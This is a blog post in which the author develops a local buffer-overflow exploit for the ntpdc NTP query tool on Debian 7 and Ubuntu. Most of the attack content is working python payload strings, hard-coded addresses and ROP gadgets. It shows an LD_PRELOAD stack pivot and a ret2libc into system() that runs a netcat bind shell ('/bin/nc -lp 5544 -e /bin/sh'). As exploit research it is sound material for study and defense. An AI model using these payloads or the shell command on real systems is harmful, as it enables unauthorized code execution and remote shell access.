title: ntpdc local buffer overflow
---

Alejandro Hdez (@nitr0usmx) recently [tweeted](https://twitter.com/nitr0usmx/status/550372148448333825) about a trivial buffer overflow in ntpdc, a deprecated NTP query tool still available and packaged with any NTP install.  He posted a screenshot of the crash as the result of a large buffer passed into a vulnerable `gets` call.  After digging into it a bit, I decided it'd be a fun exploit to write, and it was.  There are a few quarks to it that make it of particular interest, of which I've detailed below.

As noted, the bug is the result of a vulnerable `gets`, which can be crashed with the following:

```
$ python -c 'print "A"*600' | ntpdc
***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' unknown
Segmentation fault
```

Loading into gdb on an x86 Debian 7 system:

```
gdb-peda$ i r eax edx esi
eax            0x41414141   0x41414141
edx            0x41414141   0x41414141
esi            0x41414141   0x41414141
gdb-peda$ x/i $eip
=> 0xb7fa1d76 <el_gets+22>: mov    eax,DWORD PTR [esi+0x14]
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Notice the `checksec` results of the binary, now compare this to a snippet of the `paxtest` output:

```
Mode: Blackhat
Linux deb7-32 3.2.0-4-486 #1 Debian 3.2.63-2+deb7u2 i686 GNU/Linux

Executable shared library bss            : Vulnerable
Executable shared library data           : Vulnerable
```

And the result of Debian's recommended `hardening-check`:

```
$ hardening-check /usr/bin/ntpdc 
/usr/bin/ntpdc:
 Position Independent Executable: no, normal executable!
 Stack protected: yes
 Fortify Source functions: yes (some protected functions found)
 Read-only relocations: yes
 Immediate binding: no, not found!
```

Interestingly enough, I discovered this oddity after I had gained code execution in a place I shouldn't have.  We're also running with ASLR enabled:

```
$ cat /proc/sys/kernel/randomize_va_space 
2
```

I'll explain why the above is interesting in a moment.

So in our current state, we control three registers and an instruction dereferencing `ESI+0x14`.  If we take a look just a few instructions ahead, we see the following:

```
gdb-peda$ x/8i $eip
=> 0xb7fa1d76 <el_gets+22>: mov    eax,DWORD PTR [esi+0x14] ; deref ESI+0x14 and move into EAX
   0xb7fa1d79 <el_gets+25>: test   al,0x2                   ; test lower byte against 0x2
   0xb7fa1d7b <el_gets+27>: je     0xb7fa1df8 <el_gets+152> ; jump if ZF == 1
   0xb7fa1d7d <el_gets+29>: mov    ebp,DWORD PTR [esi+0x2c] ; doesnt matter 
   0xb7fa1d80 <el_gets+32>: mov    DWORD PTR [esp+0x4],ebp  ; doesnt matter
   0xb7fa1d84 <el_gets+36>: mov    DWORD PTR [esp],esi      ; doesnt matter
   0xb7fa1d87 <el_gets+39>: call   DWORD PTR [esi+0x318]    ; call a controllable pointer 
```

I've detailed the instructions above, but essentially we've got a free CALL.  In order to reach this, we need an ESI value that at +0x14 will set ZF == 0 (to bypass the test/je) and at +0x318 will point into controlled data.

Naturally, we should figure out where our payload junk is and go from there.

```
gdb-peda$ searchmem 0x41414141
Searching for '0x41414141' in: None ranges
Found 751 results, display max 256 items:
 ntpdc : 0x806ab00 ('A' <repeats 200 times>...)

0x08069000 0x0806b000 rw-p  /usr/bin/ntpdc
[snip]
```

Our payload is copied into BSS, which is beneficial as this will remain unaffected by ASLR, further bonus points because our binary wasn't compiled with PIE.  We now need to move back -0x318 and look for a value that will set ZF == 0 with the `test al,0x2` instruction.  A value at `0x806a9e1` satisfies both the +0x14 and +0x318 requirements:

```
gdb-peda$ x/wx 0x806a9cd+0x14
0x806a9e1:  0x6c61636f
gdb-peda$ x/wx 0x806a9cd+0x318
0x806ace5:  0x41414141
```

After figuring out the offset in the payload for ESI, we just need to plug `0x806a9cd` in and hopefully we'll have EIP:

```
$ python -c 'print "A"*485 + "C"*4 + "A"*79 + "\xcd\xa9\x06\x08" + "C"*600' > crash.info
$ gdb -q /usr/bin/ntpdc
$ r < crash.info

Now that we've got EIP, it's a simple matter of stack pivoting to execute a ROP payload.  Let's figure out where that `"C"*600` lands in memory and redirect EIP there:

```
gdb-peda$ searchmem 0x43434343

 ntpdc : 0x806ad3c ('C' <repeats 200 times>...)
 [snip]
```

And we'll fill it with `\xcc` to ensure we're there (theoretically triggering NX):

```
$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\xcc"*600' > crash.info

Er, what?  It appears to be executing code in BSS! Recall the output of paxtest/checksec/hardening-check from earlier, NX was clearly enabled.  This took me a few hours to figure out, but it ultimately came down to Debian not distributing x86 images with PAE, or Physical Address Extension.  PAE is a kernel feature that allows 32-bit CPU's to access physical page tables and doubling each entry in the page table and page directory.  This third level of paging and increased entry size is required for NX on x86 architectures because NX adds a single 'dont execute' bit to the page table.  You can read more about PAE [here](http://en.wikipedia.org/wiki/Physical_Address_Extension), and the original NX patch [here](http://lwn.net/Articles/87808/).

This flag can be tested for with a simple grep of `/proc/cpuinfo`; on a fresh install of Debian 7, a grep for PAE will turn up empty, but on something with support, such as Ubuntu, you'll get the flag back.

Because I had come this far already, I figured I might as well get the exploit working.  At this point it was simple, anyway:

```
$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\x90"*4 + "\x68\xec\xf7\xff\xbf\x68\x70\xe2\xc8\xb7\x68\x30\xac\xc9\xb7\xc3"' > input2.file

```

This uses a simple `system` payload with hard-coded addresses, because at this point it's an old-school, CTF-style exploit.  And it works.  With this trivial PoC working, I decided to check another box I had to verify this is a common distribution method.  An Ubuntu VM said otherwise:

```
$ uname -a
Linux bryan-VirtualBox 3.2.0-74-generic #109-Ubuntu SMP Tue Dec 9 16:47:54 UTC 2014 i686 i686 i386 GNU/Linux

$ cat /proc/sys/kernel/randomize_va_space

```

Quite a different story.  We need to bypass full RELRO (no GOT overwrites), PIE+ASLR, NX, SSP, and ASCII armor.  In our current state, things are looking pretty grim.  As an aside, it's important to remember that because this is a local exploit, the attacker is assumed to have limited control over the system.  Ergo, an attacker may inspect and modify the system in the same manner a limited user could.  This becomes important with a few techniques we're going to use moving forward.

Our first priority is stack pivoting; we won't be able to ROP to victory without control over the stack.  There are a few options for this, but the easiest option is likely going to be an `ADD ESP, ?` gadget.  The problem with this being that we need to have some sort of control over the stack or be able to modify ESP somewhere into BSS that we control.  Looking at the output of `ropgadget`, we've got 36 options, almost all of which are of the form `ADD ESP, ?`.

After looking through the list, I determined that none of the values led to control over the stack; in fact, nothing I injected landed on the stack.  I did note, however, the following:

```
gdb-peda$ x/6i 0x800143e0
   0x800143e0: add    esp,0x256c
   0x800143e6: pop    ebx
   0x800143e7: pop    esi
   0x800143e8: pop    edi
   0x800143e9: pop    ebp
   0x800143ea: ret 
gdb-peda$ x/30s $esp+0x256c
0xbffff3a4:  "-1420310755.557158-104120677"
0xbffff3c1:  "WINDOWID=69206020"
0xbffff3d3:  "GNOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM"
0xbffff3fd:  "GTK_MODULES=canberra-gtk-module:canberra-gtk-module"
```

These are environmental variables passed into the application and located on the program stack.  Using the ROP gadget `ADD ESP, 0x256c`, followed by a series of register POPs, we could land here.  Controlling this is easy with the help of LD_PRELOAD, a neat trick [documented](http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/) by Dan Rosenberg in 2010.  By exporting LD_PRELOAD, we can control uninitialized data located on the stack, as follows:

```
$ export LD_PRELOAD=`python -c 'print "A"*10000'`
$ gdb -q /usr/bin/ntpdc
gdb-peda$ r < input.file
[..snip..]
gdb-peda$ x/10wx $esp+0x256c
0xbfffedc8: 0x41414141  0x41414141  0x41414141  0x41414141

0xbfffede8: 0x41414141  0x41414141
gdb-peda$ 
```

Using some pattern_create/offset magic, we can find the offset in our LD_PRELOAD string and take control over EIP and the stack:

```
$ export LD_PRELOAD=`python -c 'print "A"*8490 + "AAAA" + "BBBB"'`
$ python -c "print 'A'*485 + '\xe0\x43\x01\x80' + 'A'*79 + '\x8d\x67\x02\x80' + 'B'*600" > input.file

This gives us EIP, control over the stack, and control over a decent number of registers; however, the LD_PRELOAD trick is extremely sensitive to stack shifting which represents a pretty big problem for exploit portability.  For now, I'm going to forget about it; chances are we could brute force the offset, if necessary, or simply invoke the application with `env -i`.

From here, we need to figure out a ROP payload.  The easiest payload I can think of is a simple ret2libc.  Unfortunately, ASCII armor null bytes all of them:

```
gdb-peda$ vmmap

0x00327000 0x004cb000 r-xp /lib/i386-linux-gnu/libc-2.15.so
0x004cb000 0x004cd000 r--p /lib/i386-linux-gnu/libc-2.15.so
0x004cd000 0x004ce000 rw-p /lib/i386-linux-gnu/libc-2.15.so
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x366060 <system>
gdb-peda$ 
```

One idea I had was to simply construct the address in memory, then call it.  Using [ROPgadget](http://github.com/JonathanSalwan/ROPgadget), I hunted for ADD/SUB instructions that modified any registers we controlled.  Eventually, I discovered this gem:

```
0x800138f2: add edi, esi; ret 0;
0x80022073: call edi
```

Using the above, we could pop controlled, non-null values into EDI/ESI, that when added equaled `0x366060 <system>`.  Many values will work, but I chose `0xeeffffff + 0x11366061`:

```
EAX: 0x6c61636f ('ocal')
EBX: 0x41414141 ('AAAA')
ECX: 0x12f00

As shown above, we've got our two values in EDI/ESI and are returning to our `ADD EDI, ESI` gadget.  Once this completes, we return to our `CALL EDI` gadget, which will jump into `system`:

```
EDI: 0x366060 (<system>:   sub    esp,0x1c)
EBP: 0x41414141 ('AAAA')
ESP: 0xbfffefc0 --> 0xbffff60d ("/bin/nc -lp 5544 -e /bin/sh")
EIP: 0x80022073 --> 0xd7ff
EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x80022073: call   edi
```

Recall the format of a ret2libc: `[system() address | exit() | shell command]`; therefore, we need to stick a bogus `exit` address (in my case, junk) as well as the address of a command.  Also remember, however, that `CALL EDI` is essentially a macro for `PUSH EIP+2 ; JMP EDI`.  This means that our stack will be tainted with the address @ EIP+2.  Thanks to this, we don't really need to add an exit address, as one will be added for us.  There are, unfortunately, no `JMP EDI` gadgets in the binary, so we're stuck with a messy exit.

This culminates in:

```
$ export LD_PRELOAD=`python -c 'print "A"*8472 + "\xff\xff\xff\xee" + "\x61\x60\x36\x11" + "AAAA" + "\xf2\x38\x01\x80" + "\x73\x20\x02\x80" + "\x0d\xf6\xff\xbf" + "C"*1492'`
$ gdb -q /usr/bin/ntpdc
gdb-peda$ r < input.file

Success!  Though this is a very dirty hack, and makes no claim of portability, it works.  As noted previously, we can brute force the image base and stack offsets, though we can also execute the binary with an empty environment and no stack tampering with `env -i`, giving us a much higher chance of hitting our mark.

Overall, this was quite a bit of fun.  Although ASLR/PIE still poses an issue, this is a local bug that brute forcing and a little investigation can't take care of.  NX/RELRO/Canary/SSP/ASCII Armor have all been successfully neutralized.  I hacked up a PoC that *should* work on Ubuntu boxes as configured, but it brute forces offsets.  Test runs show it can take up to 2 hours to successfully pop a box.  Full code can be found below.
